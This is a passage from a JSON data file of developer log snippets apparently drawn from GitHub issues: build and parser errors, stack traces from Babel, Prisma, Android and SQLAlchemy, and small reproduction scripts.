        "logs": "```\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8239:27:missing name after . operator\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8240:17:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8259:7:missing ) after argument list\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8259:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8262:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8265:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8266:7:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8268:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8269:7:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8270:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8271:11:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8272:10:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8273:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8274:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8275:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8288:11:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8289:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8290:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8291:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8292:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8293:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8294:4:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8296:12:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:11:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:16:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:16:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:12:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:12:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:18:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8300:4:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8302:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8303:8:syntax error\r\n[Truncated]\n  8791:3:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  9830:7:invalid return\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  9831:1:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  1:0:Compilation produced 71 syntax errors.\r\norg.mozilla.javascript.EvaluatorException: Compilation produced 71 syntax errors.\r\n\tat com.yahoo.platform.yui.compressor.YUICompressor$1.runtimeError(YUICompressor.java:172)\r\n\tat org.mozilla.javascript.Parser.parse(Parser.java:396)\r\n\tat org.mozilla.javascript.Parser.parse(Parser.java:340)\r\n\tat com.yahoo.platform.yui.compressor.JavaScriptCompressor.parse(JavaScriptCompressor.java:315)\r\n\tat com.yahoo.platform.yui.compressor.JavaScriptCompressor.<init>(JavaScriptCompressor.java:536)\r\n\tat com.yahoo.platform.yui.compressor.YUICompressor.main(YUICompressor.java:147)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.lang.reflect.Method.invoke(Method.java:497)\r\n\tat com.yahoo.platform.yui.compressor.Bootstrap.main(Bootstrap.java:21)\r\n"
    },
    {
        "logs": "`\r\n.../test/title-generation.babel.js:1\r\n(function (exports, require, module, __filename, __dirname) { import { assert } from \"assert\";\r\n                                                              ^^^^^^\r\n\r\nSyntaxError: Unexpected token import\r\n    at exports.runInThisContext (vm.js:53:16)\r\n    at Module._compile (module.js:404:25)\r\n    at loader (.../node_modules/babel-register/lib/node.js:130:5)\r\n    at Object.require.extensions.(anonymous function) [as .js] (.../node_modules/babel-register/lib/node.js:140:7)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:311:12)\r\n    at Module.require (module.js:366:17)\r\n    at require (module.js:385:17)\r\n    at .../node_modules/mocha/lib/mocha.js:216:27\r\n    at Array.forEach (native)\r\n    at Mocha.loadFiles (.../node_modules/mocha/lib/mocha.js:213:14)\r\n    at Mocha.run (.../node_modules/mocha/lib/mocha.js:453:10)\r\n    at Object.<anonymous> (.../node_modules/mocha/bin/_mocha:393:18)\r\n    at Module._compile (module.js:425:26)\r\n    at Object.Module._extensions..js (module.js:432:10)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:311:12)\r\n    at Function.Module.runMain (module.js:457:10)\r\n    at startup (node.js:136:18)\r\n    at node.js:972:3\r\n"
    },
    {
        "logs": "`\r\n(function (exports, require, module, __filename, __dirname) { import { getBlockAbsoluteDims, cutIntoBlocks } from '../src/js/common/lib/layout';\r\n                                                              ^^^^^^\r\nSyntaxError: Unexpected token import\r\n"
    },
    {
        "logs": "```\r\n.../test/title-generation.babel.js:1\r\n(function (exports, require, module, __filename, __dirname) { import { assert } from \"assert\";\r\n                                                              ^^^^^^\r\n\r\nSyntaxError: Unexpected token import\r\n    at exports.runInThisContext (vm.js:53:16)\r\n    at Module._compile (module.js:404:25)\r\n    at loader (.../node_modules/babel-register/lib/node.js:130:5)\r\n    at Object.require.extensions.(anonymous function) [as .js] (.../node_modules/babel-register/lib/node.js:140:7)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:311:12)\r\n    at Module.require (module.js:366:17)\r\n    at require (module.js:385:17)\r\n    at .../node_modules/mocha/lib/mocha.js:216:27\r\n    at Array.forEach (native)\r\n    at Mocha.loadFiles (.../node_modules/mocha/lib/mocha.js:213:14)\r\n    at Mocha.run (.../node_modules/mocha/lib/mocha.js:453:10)\r\n    at Object.<anonymous> (.../node_modules/mocha/bin/_mocha:393:18)\r\n    at Module._compile (module.js:425:26)\r\n    at Object.Module._extensions..js (module.js:432:10)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:311:12)\r\n    at Function.Module.runMain (module.js:457:10)\r\n    at startup (node.js:136:18)\r\n    at node.js:972:3\r\n"
    },
    {
        "logs": "`AWS::Serverless::Function' is an unrecognized type, but I'm uncertain about how that is coming about when the manual process is working without a hitch.\r\n\r\n\r\n    ValidationError: Template format error: Unrecognized resource types: [AWS::Serverless::Function]\n<issue_comment>username_0: A disconnect that only just realized clicked for me was that none of the CloudFormation options covered the upload of code to S3 or the specification of any local path. I was just now able to update the Lambda function using the regular 'Deploy Lambda Function' option in VSTS. I'd had trouble with this in the past, but it looks as though my problem was a brain fart.\r\n\r\nI'm still a bit unclear on how the Create/Update can be done so that CloudFormation settings changes can be deployed. However, I now see that the scope of what CF Create/Update handles is probably lower than I thought going in.\n<issue_comment>username_0: I've now been able to successfully use the CloudFormation Create/Update function in VSTS.\r\n\r\nMy problem was that I was mistaking the Transform file that would work with Visual Studio with the full-fledged definition that it was influencing (notably, this definition does not include any "
    },
    {
        "logs": "`\r\n[docker  ] prisma_1    | org.postgresql.util.PSQLException: ERROR: missing FROM-clause entry for table \"Deployment_Alias\"\r\n[docker  ] prisma_1    |   Position: 242\r\n[docker  ] prisma_1    | \tat org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2433)\r\n[Truncated]\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgStatement.execute(PgStatement.java:365)\r\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgPreparedStatement.executeWithFlags(PgPreparedStatement.java:155)\r\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgPreparedStatement.executeQuery(PgPreparedStatement.java:118)\r\n[docker  ] prisma_1    | \tat com.zaxxer.hikari.pool.ProxyPreparedStatement.executeQuery(ProxyPreparedStatement.java:52)\r\n[docker  ] prisma_1    | \tat com.zaxxer.hikari.pool.HikariProxyPreparedStatement.executeQuery(HikariProxyPreparedStatement.java)\r\n[docker  ] prisma_1    | \tat com.prisma.api.connector.jdbc.database.BuilderBase.$anonfun$queryToDBIO$1(BuilderBase.scala:52)\r\n[docker  ] prisma_1    | \tat com.prisma.api.connector.jdbc.database.BuilderBase.$anonfun$jooqToDBIO$1(BuilderBase.scala:82)\r\n[docker  ] prisma_1    | \tat slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70)\r\n[docker  ] prisma_1    | \tat slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69)\r\n[docker  ] prisma_1    | \tat slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275)\r\n[docker  ] prisma_1    | \tat slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275)\r\n[docker  ] prisma_1    | \tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n[docker  ] prisma_1    | \tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n[docker  ] prisma_1    | \tat java.lang.Thread.run(Thread.java:748)\r\n"
    },
    {
        "logs": "```\r\n[docker  ] prisma_1    | org.postgresql.util.PSQLException: ERROR: missing FROM-clause entry for table \"Deployment_Alias\"\r\n[docker  ] prisma_1    |   Position: 242\r\n[docker  ] prisma_1    | \tat org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2433)\r\n[Truncated]\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgStatement.execute(PgStatement.java:365)\r\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgPreparedStatement.executeWithFlags(PgPreparedStatement.java:155)\r\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgPreparedStatement.executeQuery(PgPreparedStatement.java:118)\r\n[docker  ] prisma_1    | \tat com.zaxxer.hikari.pool.ProxyPreparedStatement.executeQuery(ProxyPreparedStatement.java:52)\r\n[docker  ] prisma_1    | \tat com.zaxxer.hikari.pool.HikariProxyPreparedStatement.executeQuery(HikariProxyPreparedStatement.java)\r\n[docker  ] prisma_1    | \tat com.prisma.api.connector.jdbc.database.BuilderBase.$anonfun$queryToDBIO$1(BuilderBase.scala:52)\r\n[docker  ] prisma_1    | \tat com.prisma.api.connector.jdbc.database.BuilderBase.$anonfun$jooqToDBIO$1(BuilderBase.scala:82)\r\n[docker  ] prisma_1    | \tat slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70)\r\n[docker  ] prisma_1    | \tat slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69)\r\n[docker  ] prisma_1    | \tat slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275)\r\n[docker  ] prisma_1    | \tat slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275)\r\n[docker  ] prisma_1    | \tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n[docker  ] prisma_1    | \tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n[docker  ] prisma_1    | \tat java.lang.Thread.run(Thread.java:748)\r\n"
    },
    {
        "logs": "`dart\r\nimport 'dart:async';\r\nimport 'dart:io';\r\n\r\nimport 'package:flutter/material.dart';\r\nimport 'package:simple_permissions/simple_permissions.dart';\r\n\r\nfinal Directory _photoDir = new Directory('/storage/emulated/0/DCIM/Camera');\r\n\r\nvoid main() => runApp(MyApp());\r\n\r\nclass MyApp extends StatelessWidget {\r\n  @override\r\n  Widget build(BuildContext context) {\r\n    return MaterialApp(home: Home());\r\n  }\r\n}\r\n\r\nclass Home extends StatefulWidget {\r\n\r\n  @override\r\n  HomeState createState() {\r\n    return new HomeState();\r\n  }\r\n}\r\n\r\nclass HomeState extends State<Home> {\r\n  Future<bool> _permissionCheck;\r\n\r\n  Future<bool> _checkPermission() {\r\n    return SimplePermissions.checkPermission(Permission.ReadExternalStorage);\r\n  }\r\n\r\n  Future<bool> _requestPemission() async {\r\n    return SimplePermissions.requestPermission(Permission.ReadExternalStorage);\r\n  }\r\n\r\n  @override\r\n  void initState() {\r\n    _permissionCheck = (() async {\r\n      bool hasPermission = await _checkPermission();\r\n      if (!hasPermission) {\r\n        hasPermission = await _requestPemission();\r\n      }\r\n      return hasPermission;\r\n    })();\r\n  }\r\n\r\n  @override\r\n  Widget build(BuildContext context) {\r\n    return Scaffold(\r\n      appBar: AppBar(),\r\n      body: FutureBuilder(\r\n        future: _permissionCheck,\r\n        builder: (context, status) {\r\n          if (status.connectionState == ConnectionState.done) {\r\n            if (status.data) {\r\n              print(\"Permission was granted\");\r\n              return ImageGrid(directory: _photoDir);\r\n            } else {\r\n              return Center(\r\n                child: Column(\r\n                  children: [\r\n                    Text(\"Read permission was denied, so can't read pictures. Try again by pressing below.\"),\r\n                    FlatButton(\r\n                      child: Text(\"Request Permission\"),\r\n                      onPressed: () {\r\n                        setState(() {\r\n                          _permissionCheck = _requestPemission();\r\n                        });\r\n                      },\r\n                    )\r\n                  ],\r\n                ),\r\n[Truncated]\n09-07 14:01:14.946 4741-8505/? W/InputDispatcher: Attempted to unregister already unregistered input channel '60c6d2c com.stackoverflow.username_0.imagepick/com.stackoverflow.username_0.imagepick.MainActivity (server)'\r\n09-07 14:01:14.946 4741-8506/? D/GraphicsStats: Buffer count: 2\r\n09-07 14:01:14.957 4741-8505/? W/WindowManager: Force-removing child win Window{5ae3192 u0 SurfaceView} from container Window{60c6d2c u0 com.stackoverflow.username_0.imagepick/com.stackoverflow.username_0.imagepick.MainActivity}\r\n09-07 14:01:15.022 371-371/? W/SurfaceFlinger: couldn't log to binary event log: overflow.\r\n09-07 14:01:15.041 4741-6529/? W/WindowManager: Failed looking up window\r\n    java.lang.IllegalArgumentException: Requested window android.os.BinderProxy@89613f5 does not exist\r\n        at com.android.server.wm.WindowManagerService.windowForClientLocked(WindowManagerService.java:8725)\r\n        at com.android.server.wm.WindowManagerService.windowForClientLocked(WindowManagerService.java:8716)\r\n        at com.android.server.wm.WindowState$DeathRecipient.binderDied(WindowState.java:1209)\r\n        at android.os.BinderProxy.sendDeathNotice(Binder.java:558)\r\n09-07 14:01:15.042 4741-6529/? I/WindowState: WIN DEATH: null\r\n"
    },
    {
        "logs": "`\r\n[\u221a] Flutter (Channel dev, v0.8.2, on Microsoft Windows [Version 10.0.17134.254], locale en-GB)\r\n    \u2022 Flutter version 0.8.2 at C:\\VirtualDrives\\Programs\\flutter\r\n    \u2022 Framework revision 5ab9e70727 (4 days ago), 2018-09-07 12:33:05 -0700\r\n    \u2022 Engine revision 58a1894a1c\r\n    \u2022 Dart version 2.1.0-dev.3.1.flutter-760a9690c2\r\n\r\n[\u221a] Android toolchain - develop for Android devices (Android SDK 27.0.3)\r\n    \u2022 Android SDK at C:\\VirtualDrives\\Programs\\Android\\sdk\r\n    \u2022 Android NDK location not configured (optional; useful for native profiling support)\r\n    \u2022 Platform android-28, build-tools 27.0.3\r\n    \u2022 ANDROID_HOME = C:\\VirtualDrives\\Programs\\Android\\sdk\r\n    \u2022 Java binary at: C:\\Program Files\\Android\\Android Studio\\jre\\bin\\java\r\n    \u2022 Java version OpenJDK Runtime Environment (build 1.8.0_152-release-1024-b02)\r\n    \u2022 All Android licenses accepted.\r\n\r\n[\u221a] Android Studio (version 3.1)\r\n    \u2022 Android Studio at C:\\Program Files\\Android\\Android Studio\r\n    \u2022 Flutter plugin version 28.0.1\r\n    \u2022 Dart plugin version 173.4700\r\n    \u2022 Java version OpenJDK Runtime Environment (build 1.8.0_152-release-1024-b02)\r\n\r\n[\u221a] IntelliJ IDEA Community Edition (version 2018.2)\r\n    \u2022 IntelliJ at C:\\Program Files\\JetBrains\\IntelliJ IDEA Community Edition 2018.1\r\n    \u2022 Flutter plugin version 28.0.4\r\n    \u2022 Dart plugin version 182.4323.44\r\n\r\n[\u221a] VS Code, 32-bit edition\r\n    \u2022 VS Code at C:\\Program Files (x86)\\Microsoft VS Code\r\n    \u2022 Flutter extension version 2.12.2\r\n\r\n[\u221a] VS Code, 64-bit edition (version 1.26.1)\r\n    \u2022 VS Code at C:\\Program Files\\Microsoft VS Code\r\n    \u2022 Flutter extension version 2.12.2\r\n\r\n[\u221a] Connected devices (1 available)\r\n    \u2022 Nexus 5X \u2022 00c5937b0b2c37ce \u2022 android-arm64 \u2022 Android 6.0.1 (API 23)\r\n\r\n\u2022 No issues found!\r\n"
    },
    {
        "logs": "`\r\nDescribe any user facing changes here, or delete this block.\r\n\r\nExamples of user facing changes:\r\n- API changes\r\n- Bug fixes\r\n- Any changes in behavior\r\n\r\n"
    },
    {
        "logs": "```\r\nDescribe any user facing changes here, or delete this block.\r\n\r\nExamples of user facing changes:\r\n- API changes\r\n- Bug fixes\r\n- Any changes in behavior\r\n\r\n"
    },
    {
        "logs": "`bash\r\n\u256d\u2500m@m-pc ~/ws_srrg2 \r\n\u2570\u2500$ rosrun srrg2_executor srrg2_shell -dlc srrg2_dynamic_libraries.txt -c /home/m/work/srrg2/srrg2_proslam/configurations/tum.conf -vt shared\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_viewer_ros_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_viewer_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_core_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_viewer_core_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_proslam_sensor_processing_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_qgl_viewport_ros_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_proslam_tracking_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_configurable_shell_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_viewer_core_ros_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_types2d_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_config_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_linear_solvers_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_matchable_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_slam_interfaces_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_property_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_point_cloud_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_calib_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_sparse_block_matrix_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_qgl_viewport_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_factor_graph_utils_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_projective_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_data_structures_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_proslam_mapping_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_messages_ros_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_g2o_converter_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_image_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_messages_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_proslam_registration_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_system_utils_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_converters_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_types3d_library.so ] FOUND\r\nDynamicLoaderConfig| looking for file [/home/m/ws_srrg2/devel/lib/libsrrg2_boss_library.so ] FOUND\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_viewer_ros_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_viewer_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_core_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_viewer_core_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_proslam_sensor_processing_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_qgl_viewport_ros_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_proslam_tracking_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_configurable_shell_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_viewer_core_ros_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_types2d_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_config_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_linear_solvers_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_matchable_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_slam_interfaces_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_property_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_point_cloud_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_calib_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_sparse_block_matrix_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_qgl_viewport_library.so]OK\r\nopening library [/home/m/ws_srrg2/devel/lib/libsrrg2_solver_factor_graph_utils_library.so]OK\r\n[Truncated]\n      quit              terminares shell\r\n      rm_canvas         <canvas_name>, remove a canvas\r\n      run               <source> <sink> [--pause], runs a pipeline by pushing all messages from source to sink with visual\r\n      set               <class_name>, sets a field in a config\r\n      set_name          <name/ptr> <new_name>,  sets the name of an object \r\n      show              <name/ptr>,  shows the fields of an object \r\n      types             [<type prefix>] lists available types\r\n      write             <filename>, writes a conf file\r\nConfigurableShell::run|shell is in interactive_mode\r\nSRRG> add_canvas slam_canvas slam\r\nViewerManagerShared::getCanvas|created a context with name slam_canvas\r\nadding new canvas slam_canvas (0x7efd84001c80) for module slam\r\nSRRG> run sync slam\r\nConfigurableVisualShell::startCallback|waiting for viewer to start ... ViewerManagerShared::bindViewport|context slam_canvas has been binded to viewport [21988992]\r\nready\r\nConfigurableVisualShell::startCallback|Clearing screen... \r\nConfigurableVisualShell::startCallback|ready to go\r\nvirtual srrg2_core::BaseSensorMessagePtr srrg2_core::MessageSortedSource::getMessage(): source ova\r\nCommandRunRunner::~CommandRunRunner|job done\r\nSRRG>\n<issue_comment>username_1: Hello, have you attached a viewer to the slam module before running the pipeline?\r\nYou should do "
    },
    {
        "logs": "`\r\n let queue = kue.createQueue(Object.assign(config.kue, { redis: config.redis }));\r\n        const job = queue.create('order', incomingOrder).save((err) => {\r\n          //err is always null\r\n          if (err) {\r\n            console.error(err)\r\n            apiError(res, err);\r\n          } else {\r\n            apiStatus(res, job.id, 200);\r\n          }\r\n })\r\n"
    },
    {
        "logs": "`\r\n Running setup.py install for gevent ... error\r\n     Complete output from command /usr/bin/python3 -u -c \"import setuptools, tokenize;__file__='/tmp/pip-build-jj0s6svs/gevent/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, __file__, 'exec'))\" install --record /tmp/pip-ivyvnjtq-record/install-record.txt --single-version-externally-managed --compile:\r\n     /usr/lib/python3.5/distutils/dist.py:261: UserWarning: Unknown distribution option: 'project_urls'\r\n"
    },
    {
        "logs": "`python\n\"\"\"\r\npip install SQLAlchemy-Utils==0.37.8\r\n\r\npip install SQLAlchemy==1.4.23\r\n\r\n-- code below works on SQLAlchemy==1.4.18. fails on 1.4.19. so it was introduced with 1.4.19\r\n\r\nIn [2]: print(sys.version, sys.platform)\r\n3.6.9 (default, Apr 20 2021, 10:15:16) [GCC 9.3.0] linux\r\n\"\"\"\r\n\r\n\r\nimport sqlalchemy_utils\r\nfrom sqlalchemy import Column, ForeignKey, Integer, JSON, create_engine\r\nfrom sqlalchemy.orm import declarative_base, relationship, Session\r\n\r\nBase = declarative_base()\r\n\r\n\r\nclass AAA(Base):\r\n    __tablename__ = 'aaa'\r\n    id = Column(Integer, primary_key=True)\r\n    json_column = Column(sqlalchemy_utils.JSONType, nullable=False)\r\n\r\n\r\nclass BBB(Base):\r\n    __tablename__ = 'bbb'\r\n    id = Column(Integer, primary_key=True)\r\n    aaa_id = Column(Integer, ForeignKey('aaa.id'), nullable=True)\r\n    parent = relationship('AAA', backref='children')\r\n\r\n\r\nclass CCC(Base):\r\n    __tablename__ = 'ccc'\r\n    id = Column(Integer, primary_key=True)\r\n    json_column = Column(JSON, nullable=False)\r\n\r\n\r\nclass DDD(Base):\r\n    __tablename__ = 'ddd'\r\n    id = Column(Integer, primary_key=True)\r\n    ccc_id = Column(Integer, ForeignKey('ccc.id'), nullable=True)\r\n    parent = relationship('CCC', backref='children')\r\n\r\n\r\ndef main():\r\n    eng = create_engine('postgresql://postgres@localhost/mcve', echo=False)\r\n    Base.metadata.drop_all(eng)\r\n    Base.metadata.create_all(eng)\r\n    db_session = Session(eng)\r\n\r\n    db_session.add(AAA(id=13, json_column=[1, 2, 3]))\r\n    db_session.add(BBB(id=333, aaa_id=13))\r\n\r\n    db_session.add(CCC(id=13, json_column=[1, 2, 3]))\r\n    db_session.add(DDD(id=333, ccc_id=13))\r\n    db_session.commit()\r\n\r\n    print('\\nthis works')\r\n    query = db_session.query(AAA).with_entities(AAA.id, AAA.json_column)\r\n    for (parent_id, json_column) in query:\r\n        print(parent_id, json_column)\r\n\r\n    print('\\nthis works also')\r\n    query = db_session.query(AAA).join(BBB).with_entities(AAA.id)\r\n    for (parent_id,) in query:\r\n        print(parent_id)\r\n\r\n    print('\\nthis works also. using the JSON type instead of sqlalchemy_utils.JSONType')\r\n[Truncated]\n    main()\r\n  File \"mcve.py\", line 77, in main\r\n    for (parent_id, json_column) in query:\r\n  File \"/home/jhersch/.virtualenvs/gemini3.6.9/lib/python3.6/site-packages/sqlalchemy/engine/result.py\", line 371, in iterrows\r\n    if hashed in uniques:\r\nTypeError: unhashable type: 'list'\r\n"
    },
    {
